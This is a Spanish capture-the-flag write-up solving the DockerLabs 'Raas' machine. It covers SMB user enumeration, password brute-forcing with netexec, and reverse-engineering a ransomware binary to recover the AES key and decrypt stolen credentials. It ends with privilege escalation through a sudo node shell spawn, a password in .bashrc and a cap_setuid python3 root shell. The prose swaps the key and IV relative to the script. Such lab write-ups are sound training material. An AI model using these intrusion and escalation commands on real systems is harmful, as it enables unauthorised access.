---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Raas DockerLabs (Hard)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip raas.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh raas.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-07 05:26 EST
Nmap scan report for spainmerides.dl (172.17.0.2)
Host is up (0.000034s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 07:ba:24:3e:67:86:71:2c:1c:f9:c2:65:0d:b0:f2:42 (ECDSA)
|_  256 e2:7a:9a:9d:58:2a:07:05:5f:e9:01:b6:7e:0d:e7:da (ED25519)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-01-07T10:26:52
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.56 seconds
```

Si enumeramos el `SMB` veremos lo siguiente:

```shell
smbclient -L //<IP>
```

Info:

```
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        ransomware      Disk      
        IPC$            IPC       IPC Service (dockerlabs server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 172.17.0.2 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

Vemos que hay un recurso compartido bastante interesante llamado `ransomware`, si intentamos entrar como anonimo:

```shell
smbclient //<IP>/ransomware
```

Pero vemos que no nos deja entrar como anonimo, por lo que haremos fuerza bruta para intentar descubrir las credenciales del `SMB` en el que nos deje entrar a dicho recurso compartido.

Antes enumeraremos usuarios:

```shell
enum4linux -U <IP>
```

Info:

```
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Jan  7 05:38:44 2025

 =========================================( Target Information )=========================================

Target ........... 172.17.0.2
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =============================( Enumerating Workgroup/Domain on 172.17.0.2 )=============================


[E] Can't find workgroup/domain



 ====================================( Session Check on 172.17.0.2 )====================================


[+] Server 172.17.0.2 allows sessions using username '', password ''


 =================================( Getting domain SID for 172.17.0.2 )=================================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                                                         
                                                                                                                                                             
                                                                                                                                                             
 ========================================( Users on 172.17.0.2 )========================================
                                                                                                                                                             
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: patricio Name:   Desc:                                                                                        
index: 0x2 RID: 0x3ea acb: 0x00000010 Account: calamardo        Name:   Desc: 
index: 0x3 RID: 0x3e9 acb: 0x00000010 Account: bob      Name:   Desc: 

user:[patricio] rid:[0x3e8]
user:[calamardo] rid:[0x3ea]
user:[bob] rid:[0x3e9]
enum4linux complete on Tue Jan  7 05:38:54 2025
```

Vemos que nos saca 3 usuarios:

```
patricio
calamardo
bob
```

Por lo que vamos hacer fuerza bruta con dichos usuarios en el `SMB`.

## Netexec

> users.txt

```
patricio
calamardo
bob
```

```shell
netexec smb <IP> -u users.txt -p <WORDLIST_PASSWORDS> --ignore-pw-decoding
```

Info:

```
SMB    172.17.0.2      445    DOCKERLABS     [+] DOCKERLABS\patricio:basketball
```

Vemos unas credenciales validas que hemos descubierto, por lo que haremos lo siguiente:

```shell
smbclient //<IP>/ransomware -U patricio
```

Info:

```
smb: \> ls
  .                                   D        0  Sun Jan  5 16:14:21 2025
  ..                                  D        0  Sun Jan  5 16:14:21 2025
  private.txt                         N       48  Sun Jan  5 11:27:26 2025
  nota.txt                            N      379  Sun Jan  5 11:28:19 2025
  pokemongo                           N    17592  Sat Jan  4 12:25:18 2025

                82083148 blocks of size 1024. 26207488 blocks available
```

Si listamos los archivos, veremos estos, por lo que nos pasaremos todos al `host`.

```shell
get private.txt
get nota.txt
get pokemongo
```

Si leemos `nota.txt` veremos lo siguiente:

```
estuve analizando el ransomware que el estupido de bob ejecuto para ver si lograba desencriptar sus archivos 
pero hasta ahora no he conseguido nada, me esta costando mas de lo que pensaba, asi que comparto el binario 
para que calamardo vea si puede hacer algo por bob.

Calamardo, si logras conseguir algo, lo mas urgente es que desencriptes el archivo "private.txt" por favor
```

Vemos que tendremos que hacer ingenieria inversa en el `pokemongo`.

## Escalate user bob

### Ghidra

```shell
ghidra
```

Abrimos el archivo `pokemongo` para hacerle ingenieria inversa.

Si vemos en el `main` hay varias funciones interesantes y tambien podemos ver en que cifrado (`AES`) esta cifrado el `private.txt` por lo que necesitaremos 2 claves:

> CLAVE 1 ()

En el `main` vemos los siguientes valores `hexadeciamles` los cuales estan siendo procesados por la funcion `encrypt_files_in_directory`, por lo que en `ascii` seria lo siguiente:

* **`local_438`** (0x3837363534333231) → **"87654321"**
* **`local_430`** (0x3635343332313039) → **"65432109"**

Todo junto se veria de la siguiente forma:

```
1234567890123456
```

> CLAVE 2 ()

Si nos vamos a la funcion `recon` podremos ver varios elemento `hexadeciamles` que si los pasamos a `ascii` podremos construir la siguiente clave.

#### Valores hexadecimales:

1. **`0x70713079`**:
   * ASCII: **"pq0y"**
   * Invertido: **"y0qp"**
2. **`0x62786a66`**:
   * ASCII: **"bxjf"**
   * Invertido: **"fjxb"**
3. **`100`** (en 2 bytes):
   * Hexadecimal: **`0x64`**
   * ASCII: **"d"**
   * Invertido: **"d"** (no cambia)
4. **`0x34303937`**:
   * ASCII: **"4097"**
   * Invertido: **"7904"**
5. **`0x37`**:
   * ASCII: **"7"**
   * Invertido: **"7"** (no cambia)
6. **`0x65393239`**:
   * ASCII: **"e929"**
   * Invertido: **"929e"**
7. **`0x77`**:
   * ASCII: **"w"**
   * Invertido: **"w"** (no cambia)
8. **`0x66336461716d6f30`**:
   * ASCII: **"f3daqmo0"**
   * Invertido: **"0omqad3f"**
9. **`0x63736734`**:
   * ASCII: **"csg4"**
   * Invertido: **"4gsc"**
10. **`0x6c`**:

* ASCII: **"l"**
* Invertido: **"l"** (no cambia)

Todo junto se veria algo tal que asi:

```
y0qpfjxbd79047929ew0omqad3f4gscl
```

Este tipo de cifrado esta formado por una `Clave` y un `IV`:

```
Clave = 1234567890123456
IV = y0qpfjxbd79047929ew0omqad3f4gscl
```

Vamos a crear un script para decodificarlo:

> decrypt.py

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import sys

# Clave y vector de inicialización (IV)
key = b'y0qpfjxbd79047929ew0omqad3f4gscl'  # 32 bytes para AES-256
iv = b'1234567890123456'  # 16 bytes para AES

# Verificar que se pasa el archivo cifrado como argumento
if len(sys.argv) != 2:
    print("Uso: python decrypt_file.py <archivo_cifrado>")
    sys.exit(1)

encrypted_file = sys.argv[1]

# Leer el archivo encriptado
try:
    with open(encrypted_file, 'rb') as f:
        encrypted_data = f.read()
except FileNotFoundError:
    print(f"El archivo {encrypted_file} no existe.")
    sys.exit(1)

# Crear un objeto cifrador
cipher = AES.new(key, AES.MODE_CBC, iv)

# Desencriptar los datos
try:
    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
    # Guardar los datos desencriptados en un archivo
    output_file = encrypted_file.replace('.txt', '_decrypted.bin')
    with open(output_file, 'wb') as f:
        f.write(decrypted_data)
    print(f"Desencriptación completada con éxito. Archivo guardado en: {output_file}")
except ValueError as e:
    print(f"Error al desencriptar los datos: {e}")
```

```shell
pip3 install pycryptodome
```

```shell
python3 decrypt.py private.txt
```

Info:

```
Desencriptación completada con éxito. Archivo guardado en: private_decrypted.bin
```

Ahora si leemos el archivo desencriptado:

```
las credenciales ssh son: bob:56000nmqpL
```

Vemos que obtuvimos unas credenciales, por lo que haremos lo siguiente:

### SSH

```shell
ssh bob@<IP>
```

Metemos como contraseña `56000nmqpL` y veremos que estamos dentro.

## Escalate user calamardo

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for bob on dockerlabs:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bob may run the following commands on dockerlabs:
    (calamardo) NOPASSWD: /bin/node
```

Vemos que podemos ejecutar el binario `node` como el usuario `calamardo`, por lo que vamos hacer lo sisguiente:

```shell
sudo -u calamardo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
bash
```

Y con esto ya seremos el usuario `calamardo`.

## Escalate user patricio

Si hacemos lo siguiente:

```shell
cat .bashrc | grep "patricio"
```

Info:

```
# should be on the output of commands, not on the prompt patricio:Jap0n16ydcbd***
```

Por lo que vemos nos muestra las credenciales del usuario `patricio`, por lo que escalaremos a el de la siguiente forma:

```shell
su patricio
```

Metemos comocontraseña `Jap0n16ydcbd***` y ya seremos dicho usuario.

## Escalate Privileges

Si vemos las `capabilities` que tenemos con el usuario, veremos lo siguiente:

```shell
getcap -r / 2>/dev/null
```

Info:

```
/home/patricio/.ssh/python3 cap_setuid=ep
```

Por lo que haremos lo siguiente:

```shell
/home/patricio/.ssh/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

Info:

```
# whoami
root
#
```

Y con esto ya seremos `root`.
